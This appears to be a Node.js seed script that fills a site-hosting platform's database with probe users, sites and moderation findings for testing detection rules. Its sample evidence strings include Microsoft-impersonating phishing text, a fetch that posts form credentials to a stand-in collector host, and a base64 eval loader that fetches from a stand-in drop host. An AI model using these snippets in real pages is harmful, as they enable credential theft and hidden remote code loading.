import { createRequire } from "node:module";
import { randomBytes, scrypt as _scrypt } from "node:crypto";
import { promisify } from "node:util";

const require = createRequire("file:///C:/Users/edmem/kodely-prod/package.json");
const { PrismaClient } = require("@prisma/client");
const scrypt = promisify(_scrypt);

const PREFIX = "zz-sites-probe";
const db = new PrismaClient();

async function hashPassword(password) {
  const salt = randomBytes(16);
  const key = await scrypt(password, salt, 64);
  return `scrypt$${salt.toString("hex")}$${key.toString("hex")}`;
}

const PASSWORD = "ProbePassw0rd!probe";
const passwordHash = await hashPassword(PASSWORD);

const admin = await db.user.upsert({
  where: { email: `${PREFIX}-admin@example.invalid` },
  update: { role: "ADMIN", passwordHash },
  create: { email: `${PREFIX}-admin@example.invalid`, name: "Probe Admin", role: "ADMIN", passwordHash },
});

const owner = await db.user.upsert({
  where: { email: `${PREFIX}-owner@example.invalid` },
  update: {},
  create: { email: `${PREFIX}-owner@example.invalid`, name: "Probe Owner", role: "CUSTOMER" },
});

// Three published probe sites so pagination/search/rollups have something real.
const specs = [
  { slug: `${PREFIX}-phish`, name: "Probe Phish Lookalike", files: 6, findings: "many" },
  { slug: `${PREFIX}-clean`, name: "Probe Clean Site", files: 3, findings: "none" },
  { slug: `${PREFIX}-wallet`, name: "Probe Wallet Demo", files: 4, findings: "few" },
];

const made = [];
for (const spec of specs) {
  const project = await db.project.upsert({
    where: { slug: spec.slug },
    update: { publishedAt: new Date() },
    create: {
      slug: spec.slug,
      name: spec.name,
      userId: owner.id,
      publishedAt: new Date(),
    },
  });
  made.push(project);

  await db.projectFile.deleteMany({ where: { projectId: project.id } });
  await db.projectFile.createMany({
    data: [
      ...Array.from({ length: spec.files }, (_, i) => ({
        projectId: project.id,
        path: i === 0 ? "index.html" : `assets/chunk-${i}.js`,
        content: "<!-- probe -->",
        published: true,
        kind: "build",
      })),
      { projectId: project.id, path: "index.html", content: "<!-- probe draft -->", published: false, kind: "build" },
      { projectId: project.id, path: "src/App.tsx", content: "// probe source", published: false, kind: "source" },
    ],
  });

  await db.build.deleteMany({ where: { projectId: project.id } });
  await db.build.create({
    data: {
      projectId: project.id,
      status: "SUCCEEDED",
      model: "probe-model",
      prompt: "probe",
      inputTokens: 10,
      outputTokens: 20,
    },
  });

  await db.moderationFinding.deleteMany({ where: { projectId: project.id } });
  const rows = [];
  if (spec.findings === "many") {
    rows.push(
      { rule: "brand-impersonation-credential-form", severity: "high", path: "dist/assets/index-a1b2.js", evidence: "…Sign in to your Microsoft account to continue. We could not verify your identity, please re-enter your password below and confirm…", action: "recorded" },
      { rule: "credential-post-off-origin", severity: "medium", path: "dist/assets/index-a1b2.js", evidence: "…fetch(\"https://collector.example.invalid/api/v2/submit\", { method: \"POST\", body: JSON.stringify(form) })…", action: "recorded" },
      { rule: "password-form-on-static-site", severity: "low", path: "index.html", evidence: "…<input type=\"password\" name=\"pw\" class=… placeholder=\"Password\" required />…", action: "recorded" },
      { rule: "brand-mention-near-credential-form", severity: "low", path: "src/Login.tsx", evidence: "…continue with Google · or sign in with your email and password below…", action: "recorded" },
      { rule: "runtime-obfuscated-payload", severity: "medium", path: "dist/assets/vendor-9f.js", evidence: "…eval(atob(\"ZmV0Y2goImh0dHBzOi8vZHJvcC5leGFtcGxlLmludmFsaWQvIik=\"))…", action: "recorded" },
    );
  } else if (spec.findings === "few") {
    rows.push(
      { rule: "wallet-connect-present", severity: "low", path: "dist/assets/index-77.js", evidence: "…if (window.ethereum) { await window.ethereum.request({ method: \"eth_requestAccounts\" }) }…", action: "recorded" },
      { rule: "wallet-seed-phrase-capture", severity: "low", path: "src/Faq.tsx", evidence: "…never share your recovery phrase with anyone — no one from support will ever ask for it…", action: "recorded" },
    );
  }
  if (rows.length) {
    await db.moderationFinding.createMany({
      data: rows.map((r) => ({ ...r, projectId: project.id })),
    });
  }
}

